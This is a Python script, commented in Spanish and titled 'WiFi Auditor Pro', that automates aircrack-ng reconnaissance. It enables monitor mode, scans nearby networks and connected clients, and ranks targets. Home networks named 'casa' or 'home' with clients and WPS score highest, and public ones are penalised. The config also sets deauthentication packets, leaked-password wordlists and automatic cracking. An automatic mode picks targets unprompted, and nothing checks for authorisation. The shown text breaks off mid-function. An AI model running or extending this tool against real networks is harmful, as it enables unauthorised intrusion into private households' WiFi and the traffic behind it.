#!/usr/bin/env python3
"""
WiFi Auditor Pro - Script mejorado de auditoría de redes inalámbricas
Desarrollado para auditoría de seguridad profesional
Autor: Nicolas - Auditor de Seguridad
Versión: 2.0
"""

import os
import sys
import time
import json
import signal
import subprocess
import threading
import argparse
from datetime import datetime
from pathlib import Path
import re
import random

class Colors:
    """Colores para la salida del terminal"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class WiFiAuditor:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.targets = []
        self.handshake_dir = Path("handshakes")
        self.wordlist_dir = Path("wordlists")
        self.config_file = Path("wifi_auditor_config.json")
        self.session_log = Path(f"audit_session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
        self.cracked_networks = []
        self.running = True
        
        # Crear directorios necesarios
        self.handshake_dir.mkdir(exist_ok=True)
        self.wordlist_dir.mkdir(exist_ok=True)
        
        # Cargar configuración
        self.load_config()
        
        # Configurar manejo de señales
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        
        # Guardar estado original del sistema para restauración
        self._save_original_state()

    def load_config(self):
        """Cargar configuración desde archivo JSON"""
        default_config = {
            "handshake_timeout": 60,
            "deauth_packets": 10,
            "scan_time": 30,
            "wordlists": [
                "rockyou.txt",
                "darkweb2017-top10000.txt",
                "common_passwords.txt"
            ],
            "excluded_networks": [],
            "target_encryption": ["WPA", "WPA2", "WPS"],
            "min_signal_strength": -70,
            "auto_crack": True,
            "verbose": True
        }
        
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    self.config = {**default_config, **json.load(f)}
            except:
                self.config = default_config
        else:
            self.config = default_config
            self.save_config()

    def save_config(self):
        """Guardar configuración actual"""
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)

    def safe_input(self, prompt, default=None, allow_empty=False):
        """Entrada segura de usuario con manejo robusto de EOF y KeyboardInterrupt"""
        import sys
        
        # Verificar si estamos en un entorno interactivo
        if not sys.stdin.isatty():
            if default is not None:
                self.log(f"Entorno no interactivo - usando valor por defecto: {default}", "WARNING")
                return default
            else:
                self.log("Entorno no interactivo sin valor por defecto - cancelando", "ERROR")
                raise EOFError("No hay entrada disponible")
        
        try:
            result = input(prompt).strip()
            
            # Si la entrada está vacía y no se permiten entradas vacías
            if not result and not allow_empty and default is not None:
                self.log(f"Entrada vacía - usando valor por defecto: {default}", "INFO")
                return default
            
            return result
            
        except EOFError:
            if default is not None:
                self.log("EOF detectado - usando valor por defecto", "WARNING")
                return default
            else:
                self.log("EOF detectado sin valor por defecto - cancelando operación", "ERROR")
                raise EOFError("Entrada terminada inesperadamente")
                
        except KeyboardInterrupt:
            self.log("Entrada cancelada por usuario (Ctrl+C)", "WARNING")
            raise KeyboardInterrupt("Usuario canceló la operación")
    
    def robust_input(self, prompt, max_attempts=3):
        """Entrada ultra robusta que intenta diferentes métodos"""
        import sys
        
        for attempt in range(max_attempts):
            try:
                self.log(f"Intento {attempt + 1}/{max_attempts} de entrada interactiva", "INFO")
                
                # Método 1: input() estándar con flush forzado
                sys.stdout.write(prompt)
                sys.stdout.flush()
                
                try:
                    result = input().strip()
                    if result:  # Si obtenemos algo, devolver inmediatamente
                        return result
                    else:
                        self.log("Entrada vacía, solicitando nuevamente...", "WARNING")
                        continue
                        
                except EOFError:
                    self.log(f"EOF en intento {attempt + 1}", "WARNING")
                    if attempt < max_attempts - 1:
                        continue
                    else:
                        raise EOFError("No se pudo obtener entrada después de varios intentos")
                
            except KeyboardInterrupt:
                self.log("Entrada cancelada por usuario", "WARNING")
                raise
            except Exception as e:
                self.log(f"Error en intento {attempt + 1}: {e}", "ERROR")
                if attempt == max_attempts - 1:
                    raise
        
        raise EOFError("No se pudo obtener entrada después de todos los intentos")
    
    def automatic_fallback_selection(self):
        """Selección automática cuando no hay entrada interactiva disponible"""
        self.log("=== MODO AUTOMÁTICO ACTIVADO (Fallback) ===", "WARNING")
        
        # Prioridad 1: Redes con clientes (más fáciles)
        clients_targets = [t for t in self.targets if t['clients'] > 0]
        if clients_targets:
            # Ordenar por número de clientes y señal
            selected = sorted(clients_targets, key=lambda x: (-x['clients'], -x['power']))[:5]
            self.log(f"✨ Selección automática: {len(selected)} redes con clientes", "SUCCESS")
            
            print(f"\n{Colors.GREEN}✅ Seleccionadas automáticamente (redes con clientes):{Colors.END}")
            for i, target in enumerate(selected, 1):
                print(f"  {i}. {target['essid']} (👥{target['clients']} clientes, {target['power']}dBm)")
            
            return selected
        
        # Prioridad 2: Redes con WPS (más fáciles de romper)
        wps_targets = [t for t in self.targets if 'WPS' in t['encryption']]
        if wps_targets:
            selected = sorted(wps_targets, key=lambda x: -x['power'])[:3]
            self.log(f"⚡ Selección automática: {len(selected)} redes con WPS", "SUCCESS")
            
            print(f"\n{Colors.PURPLE}✅ Seleccionadas automáticamente (redes WPS):{Colors.END}")
            for i, target in enumerate(selected, 1):
                print(f"  {i}. {target['essid']} (WPS, {target['power']}dBm)")
            
            return selected
        
        # Prioridad 3: Mejores señales (modo experto)
        best_signal = sorted(self.targets, key=lambda x: -x['power'])[:3]
        self.log(f"📡 Selección automática: {len(best_signal)} redes con mejor señal", "INFO")
        
        print(f"\n{Colors.YELLOW}✅ Seleccionadas automáticamente (mejor señal):{Colors.END}")
        for i, target in enumerate(best_signal, 1):
            print(f"  {i}. {target['essid']} ({target['power']}dBm)")
        
        return best_signal
    
    def log(self, message, level="INFO"):
        """Logging mejorado con timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] [{level}] {message}"
        
        if level == "ERROR":
            print(f"{Colors.RED}{log_message}{Colors.END}")
        elif level == "SUCCESS":
            print(f"{Colors.GREEN}{log_message}{Colors.END}")
        elif level == "WARNING":
            print(f"{Colors.YELLOW}{log_message}{Colors.END}")
        elif level == "INFO":
            print(f"{Colors.CYAN}{log_message}{Colors.END}")
        
        # Escribir al archivo de log
        with open(self.session_log, 'a') as f:
            f.write(log_message + '\n')

    def signal_handler(self, signum, frame):
        """Manejo de señales para limpieza"""
        self.log("Recibida señal de interrupción, limpiando...", "WARNING")
        self.running = False
        self.cleanup()
        sys.exit(0)

    def run_command(self, command, capture_output=True, timeout=None):
        """Ejecutar comando con mejor manejo de errores y control de procesos"""
        import signal
        import psutil
        
        # Timeout por defecto de 30 segundos para comandos interactivos
        if timeout is None and any(cmd in command for cmd in ['aircrack-ng', 'airodump-ng', 'aireplay-ng']):
            timeout = 30
        
        process = None
        try:
            if capture_output:
                process = subprocess.Popen(
                    command, shell=True, stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid
                )
                
                # Esperar con timeout
                try:
                    stdout, stderr = process.communicate(timeout=timeout)
                    return process.returncode == 0, stdout, stderr
                except subprocess.TimeoutExpired:
                    self.log(f"Comando expirado, terminando proceso: {command[:50]}...", "WARNING")
                    # Terminar grupo de procesos completo
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                        process.wait(timeout=5)
                    except:
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                        except:
                            pass
                    return False, "", "Timeout"
            else:
                process = subprocess.Popen(command, shell=True, preexec_fn=os.setsid)
                try:
                    process.wait(timeout=timeout)
                    return process.returncode == 0, "", ""
                except subprocess.TimeoutExpired:
                    self.log(f"Comando sin captura expirado: {command[:50]}...", "WARNING")
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                        process.wait(timeout=5)
                    except:
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                        except:
                            pass
                    return False, "", "Timeout"
                    
        except Exception as e:
            self.log(f"Error ejecutando comando: {e}", "ERROR")
            if process:
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                except:
                    pass
            return False, "", str(e)

    def check_root(self):
        """Verificar permisos de root"""
        if os.geteuid() != 0:
            self.log("Este script requiere permisos de administrador", "ERROR")
            sys.exit(1)

    def check_dependencies(self):
        """Verificar dependencias necesarias"""
        # Verificar herramientas esenciales con rutas completas
        essential_tools = {
            'aircrack-ng': ['/usr/bin/aircrack-ng', '/usr/sbin/aircrack-ng'],
            'airmon-ng': ['/usr/bin/airmon-ng', '/usr/sbin/airmon-ng'],
            'airodump-ng': ['/usr/bin/airodump-ng', '/usr/sbin/airodump-ng'],
            'aireplay-ng': ['/usr/bin/aireplay-ng', '/usr/sbin/aireplay-ng'],
            'iwconfig': ['/usr/sbin/iwconfig', '/sbin/iwconfig'],
            'iw': ['/usr/sbin/iw', '/sbin/iw']
        }
        
        missing = []
        found_paths = {}
        
        for tool, possible_paths in essential_tools.items():
            tool_found = False
            for path in possible_paths:
                if os.path.exists(path):
                    found_paths[tool] = path
                    tool_found = True
                    break
            
            if not tool_found:
                # Intento final con which
                success, output, _ = self.run_command(f"which {tool} 2>/dev/null")
                if success and output.strip():
                    found_paths[tool] = output.strip()
                    tool_found = True
            
            if not tool_found:
                missing.append(tool)
        
        # Actualizar las rutas en el sistema
        if found_paths:
            self.tool_paths = found_paths
            self.log(f"Herramientas encontradas: {list(found_paths.keys())}", "SUCCESS")
        
        if missing:
            self.log(f"Dependencias faltantes: {', '.join(missing)}", "ERROR")
            self.log("Ejecuta: sudo apt install aircrack-ng wireless-tools iw", "ERROR")
            return False
        
        self.log("Todas las dependencias están disponibles", "SUCCESS")
        return True

    def get_interfaces(self):
        """Obtener interfaces de red WiFi disponibles con detección mejorada"""
        interfaces = []
        
        self.log("Detectando interfaces WiFi...", "INFO")
        
        # Método 1: Verificación en /sys/class/net (más confiable)
        try:
            import os
            self.log("Método 1: Escaneando /sys/class/net/", "INFO")
            for iface in os.listdir('/sys/class/net/'):
                wireless_path = f'/sys/class/net/{iface}/wireless'
                if os.path.exists(wireless_path):
                    if iface not in interfaces:
                        interfaces.append(iface)
                        self.log(f"Interfaz WiFi encontrada: {iface}", "SUCCESS")
        except Exception as e:
            self.log(f"Error en método 1: {e}", "WARNING")
        
        # Método 2: iw dev (moderno y confiable)
        self.log("Método 2: Verificando con iw dev", "INFO")
        iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
        success, output, _ = self.run_command(f"{iw_path} dev 2>/dev/null")
        if success:
            current_interface = None
            for line in output.split('\n'):
                line = line.strip()
                if line.startswith('Interface '):
                    current_interface = line.split()[1]
                elif line.startswith('type ') and current_interface:
                    if 'managed' in line.lower() or 'monitor' in line.lower():
                        if current_interface not in interfaces:
                            interfaces.append(current_interface)
                            self.log(f"Interfaz WiFi confirmada: {current_interface}", "SUCCESS")
                    current_interface = None
        
        # Método 3: iwconfig (respaldo legacy)
        if not interfaces:
            self.log("Método 3: Intentando con iwconfig como respaldo", "WARNING")
            iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
            success, output, _ = self.run_command(f"{iwconfig_path} 2>/dev/null")
            if success:
                for line in output.split('\n'):
                    if 'IEEE 802.11' in line or ('ESSID:' in line and 'no wireless' not in line.lower()):
                        parts = line.split()
                        if parts:
                            interface = parts[0]
                            if interface and interface not in interfaces:
                                interfaces.append(interface)
                                self.log(f"Interfaz WiFi detectada (iwconfig): {interface}", "INFO")
        
        # Método 4: Búsqueda por patrones comunes si no hay interfaces
        if not interfaces:
            self.log("Método 4: Buscando por patrones comunes de nomenclatura", "WARNING")
            success, output, _ = self.run_command("ip link show")
            if success:
                import re
                # Buscar interfaces con patrones WiFi comunes
                wifi_patterns = [r'wlan\d+', r'wlp\d+s\d+', r'wlx[a-f0-9]+', r'wifi\d+']
                for pattern in wifi_patterns:
                    matches = re.findall(f'\d+: ({pattern}):', output)
                    for match in matches:
                        if match not in interfaces:
                            # Verificar que es realmente WiFi
                            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
                            check_success, _, _ = self.run_command(f"{iw_path} dev {match} info 2>/dev/null")
                            if check_success:
                                interfaces.append(match)
                                self.log(f"Interfaz WiFi encontrada por patrón: {match}", "SUCCESS")
        
        # Filtrar y verificar interfaces válidas
        valid_interfaces = []
        for iface in interfaces:
            self.log(f"Validando interfaz: {iface}", "INFO")
            
            # Verificación múltiple
            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
            iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
            checks = [
                f"{iw_path} dev {iface} info",
                f"{iwconfig_path} {iface}",
                f"ip link show {iface}"
            ]
            
            valid = False
            for check in checks:
                success, output, _ = self.run_command(f"{check} 2>/dev/null")
                if success and ('wireless' in output.lower() or 'wifi' in output.lower() or 'ieee 802.11' in output.lower()):
                    valid = True
                    break
            
            if valid:
                valid_interfaces.append(iface)
                self.log(f"Interfaz {iface} validada correctamente", "SUCCESS")
            else:
                self.log(f"Interfaz {iface} no es válida para WiFi", "WARNING")
        
        self.log(f"Total de interfaces WiFi encontradas: {len(valid_interfaces)}", "INFO")
        return valid_interfaces

    def select_interface(self):
        """Seleccionar interfaz de red automáticamente o manualmente"""
        interfaces = self.get_interfaces()
        
        if not interfaces:
            self.log("No se encontraron interfaces WiFi", "ERROR")
            return False
        
        if len(interfaces) == 1:
            self.interface = interfaces[0]
            self.log(f"Interface seleccionada automáticamente: {self.interface}", "INFO")
        else:
            print(f"\n{Colors.BOLD}Interfaces WiFi disponibles:{Colors.END}")
            for i, iface in enumerate(interfaces, 1):
                print(f"{i}. {iface}")
            
            try:
                choice_str = self.safe_input(
                    "\nSelecciona una interfaz (número): ",
                    default="1",  # Seleccionar primera interfaz por defecto
                    allow_empty=False
                )
                if not choice_str:
                    self.log("Selección cancelada", "WARNING")
                    return False
                choice = int(choice_str) - 1
                self.interface = interfaces[choice]
                self.log(f"Interface seleccionada: {self.interface}", "INFO")
            except (ValueError, IndexError, KeyboardInterrupt):
                self.log("Selección inválida o cancelada", "ERROR")
                return False
        
        return True

    def enable_monitor_mode(self):
        """Habilitar modo monitor con verificaciones mejoradas"""
        if not self.interface:
            self.log("No hay interfaz seleccionada", "ERROR")
            return False
        
        self.log(f"Habilitando modo monitor en {self.interface}...", "INFO")
        
        # Verificar si ya está en modo monitor  
        iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
        success, output, _ = self.run_command(f"{iwconfig_path} {self.interface} 2>/dev/null")
        if success and "Mode:Monitor" in output:
            self.log(f"{self.interface} ya está en modo monitor", "INFO")
            self.monitor_interface = self.interface
            return True
        
        # NO matar NetworkManager agresivamente - causa problemas de conectividad
        # Solo detener wpa_supplicant temporalmente si es necesario
        self.log("Preparando interfaz para modo monitor...", "INFO")
        self.run_command(f"timeout 5 pkill -f wpa_supplicant", capture_output=False)
        time.sleep(1)
        
        # Verificar si la interfaz está siendo usada
        success, output, _ = self.run_command(f"lsof /dev/{self.interface} 2>/dev/null")
        if success and output.strip():
            self.log(f"Interfaz {self.interface} en uso, intentando liberar...", "WARNING")
            # Forzar down de la interfaz
            self.run_command(f"ip link set {self.interface} down")
            time.sleep(2)
        
        # Verificar que airmon-ng puede manejar la interfaz
        airmon_path = getattr(self, 'tool_paths', {}).get('airmon-ng', '/usr/sbin/airmon-ng')
        success, output, _ = self.run_command(f"{airmon_path} 2>/dev/null")
        if not success or self.interface not in output:
            self.log(f"airmon-ng no puede manejar la interfaz {self.interface}", "WARNING")
            # Intentar con método alternativo directamente
            return self._enable_monitor_alternative()
        
        # Habilitar modo monitor con airmon-ng
        self.log(f"Ejecutando airmon-ng start {self.interface}...", "INFO")
        success, output, error = self.run_command(f"{airmon_path} start {self.interface}")
        if not success:
            self.log(f"Error habilitando modo monitor: {error}", "ERROR")
            # Intentar método alternativo con iw
            return self._enable_monitor_alternative()
        
        self.log(f"Salida de airmon-ng: {output[:200]}...", "INFO")
        
        # Obtener el nombre de la interfaz en modo monitor
        monitor_interfaces = []
        iwconfig_path = getattr(self, 'tool_paths', {}).get('iwconfig', '/usr/sbin/iwconfig')
        success, output, _ = self.run_command(f"{iwconfig_path} 2>/dev/null")
        
        # Buscar interfaces en modo monitor
        for line in output.split('\n'):
            if 'Mode:Monitor' in line:
                monitor_interfaces.append(line.split()[0])
        
        # Si no encontramos con iwconfig, buscar con iw dev (para drivers modernos como iwlwifi)
        if not monitor_interfaces:
            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
            success, iw_output, _ = self.run_command(f"{iw_path} dev 2>/dev/null")
            if success:
                current_interface = None
                for line in iw_output.split('\n'):
                    line = line.strip()
                    if line.startswith('Interface '):
                        current_interface = line.split()[1]
                    elif 'type monitor' in line.lower() and current_interface:
                        monitor_interfaces.append(current_interface)
                        current_interface = None
        
        # Intel iwlwifi: a veces crea wlp2s0mon pero no aparece inmediatamente
        if not monitor_interfaces:
            # Verificar interfaces con patrón *mon
            success, ip_output, _ = self.run_command("ip link show")
            if success:
                import re
                mon_interfaces = re.findall(r'\d+: (\w+mon):', ip_output)
                if mon_interfaces:
                    monitor_interfaces.extend(mon_interfaces)
                    self.log(f"Interfaces monitor encontradas con ip link: {mon_interfaces}", "INFO")
        
        if monitor_interfaces:
            self.monitor_interface = monitor_interfaces[0]
            self.log(f"Modo monitor habilitado: {self.monitor_interface}", "SUCCESS")
            
            # Para Intel iwlwifi, verificar que la interfaz monitor esté UP
            self.run_command(f"ip link set {self.monitor_interface} up 2>/dev/null")
            return True
        else:
            # Último intento: usar la interfaz original si airmon-ng dijo que funcionó
            if "monitor mode vif enabled" in output:
                self.monitor_interface = self.interface + "mon"
                self.log(f"Usando interfaz monitor inferida: {self.monitor_interface}", "WARNING")
                self.run_command(f"ip link set {self.monitor_interface} up 2>/dev/null")
                return True
            
            self.log("No se pudo obtener interfaz en modo monitor", "ERROR")
            return False

    def scan_networks(self, scan_time=None):
        """Escanear redes WiFi disponibles Y clientes en un solo paso como Wifite"""
        if not self.monitor_interface:
            self.log("No hay interfaz en modo monitor disponible", "ERROR")
            return False
        
        scan_time = scan_time or self.config.get('scan_time', 30)
        
        # Pre-verificación: ver si hay redes cerca usando iw scan (modo managed)
        self.log("Verificando que hay redes WiFi en el área...", "INFO")
        if hasattr(self, 'interface') and self.interface:
            iw_path = getattr(self, 'tool_paths', {}).get('iw', '/usr/sbin/iw')
            success, output, _ = self.run_command(f"{iw_path} dev {self.interface} scan 2>/dev/null | grep SSID | head -5", timeout=10)
            if success and output.strip():
                networks_found = len(output.strip().split('\n'))
                self.log(f"Pre-escaneo detectó ~{networks_found} redes en el área", "SUCCESS")
            else:
                self.log("Pre-escaneo: pocas o ninguna red detectada en el área", "WARNING")
        
        self.log(f"Escaneando redes y clientes por {scan_time} segundos...", "INFO")
        
        # Archivo temporal para captura
        scan_file = f"scan_{int(time.time())}"
        
        # UN SOLO ESCANEO para redes y clientes (como Wifite)
        airodump_path = getattr(self, 'tool_paths', {}).get('airodump-ng', '/usr/sbin/airodump-ng')
        command = f"{airodump_path} {self.monitor_interface} -w {scan_file} --output-format csv"
        
        self.log(f"Ejecutando: {command}", "INFO")
        # Iniciar proceso
        process = subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Esperar tiempo especificado
        time.sleep(scan_time)
        
        # Detener proceso
        process.terminate()
        time.sleep(2)
        
        # Leer resultados
        csv_file = f"{scan_file}-01.csv"
        if not os.path.exists(csv_file):
            self.log("No se pudo generar archivo de escaneo", "ERROR")
            # Verificar posibles archivos de escaneo alternativos
            alt_files = list(Path('.').glob(f"{scan_file}*.csv"))
            if alt_files:
                csv_file = str(alt_files[0])
                self.log(f"Usando archivo alternativo: {csv_file}", "INFO")
            else:
                self.log("Ningún archivo de escaneo fue generado - verifica que la interfaz esté en modo monitor", "ERROR")
                return False
        
        # Verificar que el archivo tiene contenido
        file_size = os.path.getsize(csv_file)
        if file_size < 100:  # Archivo muy pequeño
            self.log(f"Archivo de escaneo muy pequeño ({file_size} bytes) - posible problema de permisos o interfaz", "WARNING")
        else:
            self.log(f"Archivo de escaneo generado: {file_size} bytes", "SUCCESS")
        
        # DEBUG: Mostrar contenido del archivo para diagnosticar
        self.log(f"Analizando contenido del archivo {csv_file}...", "INFO")
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            lines = [line.strip() for line in content.split('\n') if line.strip()]
            self.log(f"Archivo tiene {len(lines)} líneas de contenido", "INFO")
            
            # Mostrar primeras líneas para debug
            if len(lines) > 0:
                self.log(f"Primera línea: {lines[0][:100]}...", "INFO")
            if len(lines) > 1:
                self.log(f"Segunda línea: {lines[1][:100]}...", "INFO")
                
        except Exception as e:
            self.log(f"Error leyendo archivo para debug: {e}", "WARNING")
        
        # Parsear redes Y clientes del mismo archivo
        self.targets = self.parse_airodump_csv_with_clients(csv_file)
        
        # Limpiar archivos temporales
        for file in Path('.').glob(f"{scan_file}*"):
            try:
                file.unlink()
            except:
                pass
        
        self.log(f"Encontradas {len(self.targets)} redes", "SUCCESS")
        return True


    def parse_airodump_csv_with_clients(self, csv_file):
        """Parsear archivo CSV de airodump-ng para redes Y clientes - ARREGLADO"""
        targets = []
        bssid_clients = {}
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Dividir en líneas y limpiar
            lines = [line.strip() for line in content.split('\n') if line.strip()]
            
            # Encontrar secciones con mejor detección
            ap_start = -1
            client_start = -1
            
            self.log(f"Buscando secciones en {len(lines)} líneas...", "INFO")
            for i, line in enumerate(lines):
                # Header de APs: debe tener BSSID como primera columna Y campos típicos de AP
                if line.startswith('BSSID') and 'ESSID' in line and 'channel' in line:
                    ap_start = i + 1
                    self.log(f"Sección AP encontrada en línea {i}: {line[:50]}...", "INFO")
                # Header de clientes: Station MAC es específico de clientes
                elif line.startswith('Station MAC') or ('Station MAC' in line and i > ap_start):
                    client_start = i + 1
                    self.log(f"Sección Cliente encontrada en línea {i}: {line[:50]}...", "INFO")
                    break
            
            # Procesar APs (redes)
            if ap_start > 0:
                self.log(f"Procesando APs desde línea {ap_start}...", "INFO")
                processed_aps = 0
                for i in range(ap_start, len(lines)):
                    # Parar cuando llegamos a la sección de clientes
                    if lines[i].startswith('Station MAC') or 'Station MAC' in lines[i][:20]:
                        self.log(f"Fin de sección AP en línea {i}: {lines[i][:50]}...", "INFO")
                        break
                    
                    line = lines[i]
                    if not line or line.startswith('#'):
                        continue
                    
                    # DEBUG: Mostrar línea que estamos procesando
                    if processed_aps < 3:  # Solo mostrar las primeras 3 para no saturar
                        self.log(f"Procesando AP línea {i}: {line[:80]}...", "INFO")
                    
                    parts = [p.strip() for p in line.split(',')]
                    self.log(f"Línea dividida en {len(parts)} partes", "INFO")
                    
                    if len(parts) >= 13:  # Más tolerante, requiere menos campos
                        try:
                            bssid = parts[0] if len(parts) > 0 else ''
                            channel = parts[3] if len(parts) > 3 else '1'
                            encryption = parts[5] if len(parts) > 5 else 'OPN'
                            power_str = parts[8] if len(parts) > 8 else '-100'
                            # ESSID puede estar en diferentes posiciones
                            essid = ''
                            for pos in [13, 14, 15, -1]:  # Probar diferentes posiciones
                                if pos < len(parts) and parts[pos].strip():
                                    essid = parts[pos].strip()
                                    break
                            
                            # Limpiar ESSID
                            if essid.startswith('"') and essid.endswith('"'):
                                essid = essid[1:-1]
                            
                            # Ser más permisivo con redes válidas
                            if bssid and len(bssid) >= 17:  # Al menos formato MAC básico
                                # Convertir power a entero
                                try:
                                    power_val = int(power_str) if power_str.lstrip('-').isdigit() else -100
                                except:
                                    power_val = -100
                                
                                # Si no hay ESSID, usar BSSID truncado como identificador
                                if not essid or essid == '' or essid == '<length:  0>':
                                    essid = f"Hidden_{bssid[-8:].replace(':', '')}"
                                
                                targets.append({
                                    'bssid': bssid,
                                    'essid': essid,
                                    'channel': channel,
                                    'encryption': encryption,
                                    'power': power_val,
                                    'clients': 0  # Se actualizará después
                                })
                                processed_aps += 1
                                
                                if processed_aps <= 3:
                                    self.log(f"AP procesado: {essid} ({bssid}) - {encryption}", "SUCCESS")
                                    
                        except Exception as e:
                            self.log(f"Error procesando línea {i}: {e}", "WARNING")
                            continue
                
                self.log(f"Total APs procesados: {processed_aps}", "INFO")
            
            # Procesar clientes
            if client_start > 0:
                for i in range(client_start, len(lines)):
                    line = lines[i]
                    if not line or line.startswith('#'):
                        continue
                    
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 6:
                        try:
                            client_mac = parts[0]
                            associated_bssid = parts[5]
                            
                            # Verificar que el cliente esté asociado a un AP
                            if (associated_bssid and 
                                associated_bssid != '(not associated)' and 
                                associated_bssid != '' and
                                len(associated_bssid) == 17):  # Formato MAC válido
                                
                                if associated_bssid not in bssid_clients:
                                    bssid_clients[associated_bssid] = set()
                                bssid_clients[associated_bssid].add(client_mac)
                        except:
                            continue
            
            # Actualizar contador de clientes
            for target in targets:
                bssid = target['bssid']
                if bssid in bssid_clients:
                    target['clients'] = len(bssid_clients[bssid])
                    if target['clients'] > 0:
                        self.log(f"  → {target['essid']}: {target['clients']} clientes conectados", "SUCCESS")
            
            # Contar cuántas redes tienen clientes
            networks_with_clients = sum(1 for t in targets if t['clients'] > 0)
            if networks_with_clients > 0:
                self.log(f"🎯 Encontradas {networks_with_clients} redes con clientes conectados!", "SUCCESS")
            else:
                self.log("No se detectaron clientes conectados a ninguna red", "WARNING")
        
        except Exception as e:
            self.log(f"Error parseando CSV: {e}", "ERROR")
        
        return targets

    def display_targets(self):
        """Mostrar objetivos encontrados con información detallada de clientes"""
        if not self.targets:
            self.log("No hay objetivos disponibles", "WARNING")
            return
        
        print(f"\n{Colors.BOLD}{Colors.UNDERLINE}Redes WiFi encontradas:{Colors.END}")
        print(f"{'#':<3} {'ESSID':<25} {'BSSID':<18} {'CH':<3} {'SEÑAL':<6} {'CLIENTES':<8} {'ENCRIPTACIÓN':<12}")
        print("-" * 85)
        
        # Ordenar por número de clientes (descendente) y luego por señal
        sorted_targets = sorted(self.targets, key=lambda x: (-x['clients'], -x['power']))
        
        for i, target in enumerate(sorted_targets, 1):
            # Color según número de clientes
            if target['clients'] > 0:
                color = Colors.GREEN
                client_text = f"🟢 {target['clients']}"
            else:
                color = Colors.YELLOW
                client_text = f"🔴 {target['clients']}"
            
            # Indicador de señal
            signal = target['power']
            if signal > -50:
                signal_icon = "🟢"  # Verde
            elif signal > -70:
                signal_icon = "🟡"  # Amarillo
            else:
                signal_icon = "🔴"  # Rojo
                
            print(f"{color}{i:<3} {target['essid']:<25} {target['bssid']:<18} "
                  f"{target['channel']:<3} {signal_icon}{signal}dBm{'':<1} {client_text:<8} {target['encryption']:<12}{Colors.END}")
        
        # Actualizar la lista de targets con el orden ordenado para que los índices coincidan
        self.targets = sorted_targets
        
        # Mostrar resumen de clientes
        total_clients = sum(t['clients'] for t in self.targets)
        networks_with_clients = sum(1 for t in self.targets if t['clients'] > 0)
        
        print(f"\n{Colors.BOLD}Resumen:{Colors.END}")
        print(f"📶 Total de redes: {len(self.targets)}")
        print(f"🟢 Redes con clientes: {networks_with_clients} ({total_clients} dispositivos total)")
        print(f"🔴 Redes sin clientes: {len(self.targets) - networks_with_clients}")
        
        if networks_with_clients > 0:
            print(f"\n{Colors.GREEN}✨ RECOMENDACIÓN: Las redes VERDES con clientes conectados tienen mayor probabilidad de éxito{Colors.END}")

    def select_targets(self, auto_mode=False):
        """Seleccionar objetivos para auditar"""
        if not self.targets:
            return []
        
        # Solo modo automático si se solicita explícitamente
        if auto_mode:
            return self.intelligent_target_selection()
        
        # Modo manual simple (por defecto)
        return self.simple_target_selection()
    
    def intelligent_target_selection(self):
        """Selección automática inteligente de objetivos"""
        self.log("=== SELECCIÓN AUTOMÁTICA INTELIGENTE ACTIVADA ===", "INFO")
        self.display_targets()
        
        # Algoritmo de selección inteligente
        scored_targets = []
        
        for target in self.targets:
            score = 0
            reasons = []
            
            # Factor 1: Clientes conectados (MUY IMPORTANTE)
            if target['clients'] > 0:
                score += target['clients'] * 50  # 50 puntos por cliente
                reasons.append(f"{target['clients']} clientes")
            
            # Factor 2: Fuerza de señal
            signal_score = max(0, target['power'] + 100)  # Convertir -70 a 30 puntos
            score += signal_score
            reasons.append(f"señal {target['power']}dBm")
            
            # Factor 3: Tipo de encriptación (WPS es más fácil)
            if 'WPS' in target['encryption']:
                score += 100
                reasons.append("WPS habilitado")
            elif 'WPA2' in target['encryption']:
                score += 30
                reasons.append("WPA2")
            elif 'WPA' in target['encryption']:
                score += 20
                reasons.append("WPA")
            
            # Factor 4: Nombre del ESSID (patrones comunes)
            essid_lower = target['essid'].lower()
            if any(pattern in essid_lower for pattern in ['familia', 'casa', 'home', 'wifi']):
                score += 25
                reasons.append("nombre común")
            
            # Factor 5: Penalizar redes corporativas/públicas
            if any(corp in essid_lower for corp in ['guest', 'public', 'free', 'hotspot']):
                score -= 50
                reasons.append("red pública")
            
            scored_targets.append({
                'target': target,
                'score': score,
                'reasons': reasons
            })
        
        # Ordenar por puntuación
        scored_targets.sort(key=lambda x: x['score'], reverse=True)
        
        # Seleccionar los mejores objetivos
        selected = []
        max_targets = self.config.get('max_auto_targets', 5)
        min_score = 50  # Puntuación mínima para considerar objetivo
        
        self.log(f"\n=== ANÁLISIS DE OBJETIVOS ===\n", "INFO")
        for i, scored in enumerate(scored_targets[:10]):
            target = scored['target']
            score = scored['score']
            reasons = ', '.join(scored['reasons'])
            
